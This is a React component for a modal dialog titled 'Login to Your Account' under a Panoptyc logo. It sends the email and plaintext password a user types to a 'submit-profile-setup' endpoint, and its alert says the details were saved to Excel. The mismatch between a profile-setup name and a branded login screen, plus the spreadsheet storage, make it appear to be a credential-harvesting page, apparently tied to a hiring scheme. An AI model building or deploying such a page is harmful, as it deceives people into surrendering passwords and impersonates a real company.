import React, { useState } from "react";
import {
  Dialog,
  DialogContent,
} from "./ui/dialog";
import { Mail, Lock, LogIn, X } from "lucide-react";

const ProfileSetupModal = ({ open, onClose }) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      const API_URL = process.env.REACT_APP_BACKEND_URL;
      const response = await fetch(`${API_URL}/api/submit-profile-setup`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const result = await response.json();
      
      if (response.ok && result.success) {
        alert(`✅ ${result.message}\n\nYour profile has been saved to Excel.\n\nEmail: ${result.data.email}\nSubmitted at: ${result.data.timestamp}`);
        handleClose();
      } else {
        throw new Error(result.detail || 'Failed to submit profile setup');
      }
    } catch (error) {
      console.error('Submission error:', error);
      alert(`❌ Error: ${error.message}\n\nPlease try again or contact support.`);
    } finally {
      setLoading(false);
    }
  };

  const handleClose = () => {
    setEmail("");
    setPassword("");
    onClose();
  };

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="max-w-xl bg-white p-0 gap-0 border-none rounded-3xl shadow-2xl">
        {/* Close button */}
        <button
          onClick={handleClose}
          className="absolute top-6 right-6 text-gray-400 hover:text-gray-600 transition-colors z-10"
        >
          <X className="w-6 h-6" />
        </button>

        {/* Logo */}
        <div className="flex justify-center pt-8 pb-6">
          <div className="bg-gray-100 rounded-2xl px-8 py-3">
            <img 
              src="https://customer-assets.emergentagent.com/job_remote-lead-hiring/artifacts/yyk8ba47_Panoptyc-Logo-HiRes.jpg" 
              alt="Panoptyc" 
              className="h-10 w-auto"
            />
          </div>
        </div>

        {/* Title */}
        <div className="text-center px-8 pb-8">
          <h2 className="text-4xl font-extrabold text-gray-900">Login to Your Account</h2>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="px-8 pb-8 space-y-6">
          {/* Email Address */}
          <div>
            <label className="block text-base font-bold text-gray-900 mb-3">
              Email Address
            </label>
            <div className="relative">
              <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email"
                className="w-full pl-12 pr-4 py-4 text-base text-gray-900 placeholder-gray-400 border-2 border-gray-200 rounded-2xl outline-none transition-all duration-200 focus:border-red-400 focus:ring-4 focus:ring-red-100 bg-gray-50"
              />
            </div>
          </div>

          {/* Password */}
          <div>
            <label className="block text-base font-bold text-gray-900 mb-3">
              Password
            </label>
            <div className="relative">
              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                className="w-full pl-12 pr-4 py-4 text-base text-gray-900 placeholder-gray-400 border-2 border-gray-200 rounded-2xl outline-none transition-all duration-200 focus:border-red-400 focus:ring-4 focus:ring-red-100 bg-gray-50"
              />
            </div>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-4 rounded-full font-bold text-lg text-white transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed hover:shadow-xl active:scale-[0.98] flex items-center justify-center gap-3 mt-2"
            style={{ backgroundColor: "#EF4444" }}
          >
            {loading ? (
              <>
                <div className="w-5 h-5 rounded-full border-2 border-white/30 border-t-white animate-spin" />
                Logging In...
              </>
            ) : (
              <>
                <LogIn className="w-5 h-5" />
                Login
              </>
            )}
          </button>

          {/* Register Link */}
          <p className="text-center text-base text-gray-600 pt-2">
            Don't have an account?{" "}
            <button type="button" className="font-bold text-red-500 hover:text-red-600">
              Register
            </button>
          </p>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default ProfileSetupModal;
